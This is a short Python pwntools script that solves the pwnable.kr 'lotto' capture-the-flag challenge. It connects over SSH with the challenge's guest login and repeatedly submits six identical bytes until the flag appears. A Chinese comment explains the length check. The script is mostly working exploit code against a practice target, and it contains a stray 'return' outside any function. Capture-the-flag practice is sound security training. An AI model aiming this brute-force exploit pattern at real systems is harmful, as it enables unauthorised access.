from pwn import *
s= ssh(host='pwnable.kr',user='lotto',password='guest',port=2222)
pro = s.process('./lotto')
print(pro.recv())
pro.sendline('1')
print(pro.recv())
str1 = ""
str1 += chr(1)+chr(1)+chr(1)+chr(1)+chr(1)+chr(1)
pro.sendline(str1)
revcstr =  pro.recv()
print(revcstr)
#exit()

while 1:
    pro.sendline('1')
    print(pro.recv())
    pro.sendline(str1)
    a =  pro.recv()
    if len(a)>71: #71是先验知识，指输入错误返回字符串的长度，就是下面字符串的长度
        print(a)
        return 0 
    #pass'''

